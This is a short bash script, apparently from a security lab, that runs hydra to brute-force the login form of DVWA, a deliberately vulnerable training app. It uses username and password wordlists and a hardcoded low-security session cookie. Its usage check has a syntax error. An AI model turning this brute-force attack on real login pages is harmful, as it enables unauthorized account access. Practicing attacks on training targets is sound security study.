#!/bin/bash

if ["$1" == ""]
then
	echo "Usage: ./brute_force.sh [IP] [dico_user.txt] [dico_pswd.txt]"
else
	hydra $1 -V -L $2 -P $3 http-post-form "/dvwa/login.php :username=^USER^&password=^PASS^&Login=Login :H=Cookie\:PHPSESSID=753fdb68cccae08c4ae5e0af6efa0bc2; security=low :F=Login failed"
fi
